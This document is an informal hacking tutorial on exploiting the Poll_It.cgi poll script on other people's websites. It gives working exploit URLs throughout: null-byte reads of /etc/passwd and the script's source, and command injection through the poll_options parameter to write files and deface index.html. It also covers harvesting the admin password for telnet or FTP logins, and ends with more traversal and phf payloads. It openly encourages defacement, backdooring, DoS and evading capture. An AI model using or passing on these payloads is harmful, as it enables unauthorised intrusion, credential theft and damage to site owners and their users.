How to "Hack" using Poll_It.cgi
-------------------------------

There are 2 main things you can do with the Poll_It.cgi vunerability
1. Deface a site
2. Owning a server

We'll start with the basics:
OK first of all we need some sites that have Poll_It.cgi Perl Script running
So open your browser to www.av.com (or another search engine)
In the search box type: url: /Poll_It.cgi

Then just scroll down, untill you find something like:
Poll It v2.0! by CGI World
Poll It v2.0 by CGI World - A Product of I2 Services, Inc. Poll Title: Do you catch and release when fishing? Sometimes. no, never. yes, always. Poll...
http://www.thedomainhere.com/cgi-bin/Poll_It.cgi 
   •  More Pages From This Site

The bit we're interested about is: http://www.thedomainhere.com/cgi-bin/
So copy that down.

To check that you have access type: http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&data_dir=poll_info.txt%00
and if there are no errors, your in!

OK so now for the first section:
1. Defacing a site
Firstly we need 2 check you have write access by doing the following:
Open http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&admin_password=&action=add_option&add_option=none&poll_options=id+>/tmp/.test%7C
then read the contents by doing: http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&data_dir=/tmp/.test%00
If your uid=??(nobody) then you *DON'T* have write access :(
So go onto the next section...

If you do, then you can try the following:
The main file is usually index.html or index.htm and its in the root dir, so if we use:
http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&admin_password=&action=add_option&add_option=none&poll_options=echo+Your Text Here!+>../index.html|
With any luck you will have changed the index.html to whatever you want.
It works with any file, usually, and you can make it display what ever text you want!

2. Owning a server
OK, so you wanna try owning a server using this, huh?
Well ok... although its not always successful, IT DOES WORK SOMETIMES!
OK, so firstly we want the passwd file, to see the server's users, so type:
http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&data_dir=/etc/passwd%00
This will give you a long list, try searching for thedomainhere and
then look at the start of that line, that will be the username.
The password is even simpler, just type:
http://www.thedomainhere.com/cgi-bin/Poll_It.cgi?load=admin&data_dir=Poll_It.cgi%00
This will show you the cgi's code, now what you are looking for is:
$admin_password = "passwordgoeshere";
Now if the admin is stupid enough, he will use the same password on his shell also

So now, its just a matter of telneting into www.thedomainhere.com
(Open run, and type: telnet www.thedomainhere.com)
Then type in the username you got from the passwd list
and for the password use the password from the Poll_It.cgi
eg: Telnet: www.thedomainhere.com Username: thedomainhere Password:passwordgoeshere
You can also use an FTP client using the same username and password, most of the time.

From there, what you do with the domain is upto you!

Some suggestions:
Deface the site
Run Eggdrops
Run BNCs
Store files
DoS people
Backdoor it

But remember, the more extream things you do, the more likly you are to get caught!

There are many more CGI Vunerabilities, that use similar techniques, such as:
way-board.cgi?db=../../../../../../../etc/passwd%00
phf?Qalias=x%0a/bin/cat%20/etc/passwd

But i'll leave those till another time!

Well have fun!
